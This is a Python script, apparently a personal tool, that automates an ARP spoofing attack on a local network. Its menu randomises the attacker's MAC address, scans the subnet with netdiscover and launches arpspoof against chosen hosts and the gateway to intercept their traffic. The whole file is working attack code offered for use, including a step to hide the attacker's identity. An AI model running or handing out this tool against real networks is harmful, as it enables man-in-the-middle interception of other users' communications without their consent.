#! /usr/bin/python3

import subprocess
import shlex
from pathlib import Path
from time import sleep

NETDCR_TXT = 'netdiscover'
IPADDR_TXT = 'ipaddress'
ERROR_CODE = 999

def runcmdgetoutput(command):
    listoutput = []
    process = subprocess.Popen(shlex.split(command), stdout=subprocess.PIPE)
    while True:
        output = str(process.stdout.readline().strip()).split("'")[1]
        if output == '' and process.poll() is not None:
            break
        if output:
            listoutput.append(output.strip())
    return listoutput

def runcmd(command):
    subprocess.run(command, stdout=subprocess.PIPE, shell=True)

def ip_input(value):
    rslst = []
    try:
        if '-' in value and ',' in value:
            fstlst = value.split(',')
            for item1 in fstlst:
                if '-' in item1:
                    num1 = int(item1.split('-')[0].strip())
                    num2 = int(item1.split('-')[1].strip())
                    for item2 in range(num1, num2+1):
                        rslst.append(item2)
                else:
                    rslst.append(int(item1.strip()))

        elif '-' in value:
            first = int(value.split('-')[0].strip())
            second = int(value.split('-')[1].strip())
            for var in range(first, second+1):
                rslst.append(var)

        elif ',' in value:
            for var in value.split(','):
                number = int(var.strip())
                rslst.append(number)

        else:
            rslst.append(int(value))
    except ValueError:
        rslst.append(ERROR_CODE)

    rslst = list(set(rslst))
    return rslst

def choose_step():
    print('**************************************************************')
    checkmac = 'unchange'
    if (currmac != permmac):
        checkmac = 'changed'
    print('Your IP: {}, Interface: {}'.format(yourIP, interface))
    print('Gateway: {}, Current MAC: {} {}'.format(gateway, currmac, checkmac))
    print('**************************************************************')
    print('1. Change my MAC address (Recommendation!)')
    print('2. Scan my network')
    print('3. Intercept IP address(es)')
    print('0. Exit')
    print('**************************************************************')
    try:
        var = int(input())
    except ValueError:
        var = ERROR_CODE
    return var

iproute = runcmdgetoutput('ip route')
gateway = iproute[0].split(" ")[2]
interface = iproute[0].split(" ")[4]
rangeIP = iproute[1].split(" ")[0]
yourIP = iproute[1].split(" ")[8]
macchanger = runcmdgetoutput('macchanger -s ' + interface)
currmac = macchanger[0].split(" ")[4]
permmac = macchanger[1].split(" ")[2]

print(' ')
print('**************************************************************')
print('*************************Minh*Nguyen**************************')
print('**************************************************************')
print('!!!!!!!!!!!!!!!!Welcome to Arp Spoofing script!!!!!!!!!!!!!!!!')

while True:
    step = choose_step()
    if step == 1: # 1. Change my MAC address
        runcmd('ifconfig ' + interface + ' down')
        result = runcmdgetoutput('macchanger -r ' + interface)
        runcmd('ifconfig ' + interface + ' up')
        runcmd('service network-manager restart')
        currmac = result[2].split(" ")[8]
        sleep(1)

    elif step == 2: # 2. Scan my network
        runcmd('gnome-terminal -- /bin/bash -c \'netdiscover -r {} | tee {}\''.format(rangeIP, NETDCR_TXT))

    elif step == 3: # 3. Arp Spoof ip address
        
        netdctxt = Path(NETDCR_TXT)
        if not netdctxt.is_file():
            print('Please run Step 2.')
            continue

        runcmd('grep -oE \"\\b([0-9]{1,3}\.){3}[1-9]{1}[0-9]{0,2}\\b\" ' + NETDCR_TXT + ' | sort -u > ' + IPADDR_TXT)
        iplst = []
        with open(IPADDR_TXT, 'r') as fin:
            i = 1
            for line in fin:
                line = line.strip()
                if gateway != line:
                    print(i, 'Ip:', line)
                    i = i+1;
                    iplst.append(line)

        print('Please select IP address(es) (Ex: 1; 1,4; 1-3; or 1-3,4) ([0] to quit): ')
        while True:
            var = input()
            rslst = ip_input(var)
            if max(rslst) <= len(iplst):
                break	

        if min(rslst) == 0:
            continue

        for ipnum in rslst:
            runcmd('gnome-terminal -- arpspoof -i {} -t {} -r {}'.format(interface, iplst[ipnum-1],gateway))
    elif step == 0: # 0. Remove residual files and Exit
        netdctxt = Path(NETDCR_TXT)
        if netdctxt.is_file():
            netdctxt.unlink()

        iptxt = Path(IPADDR_TXT)
        if iptxt.is_file():
            iptxt.unlink()

        print('Goodbye!!!')
        exit()
    else:
        pass

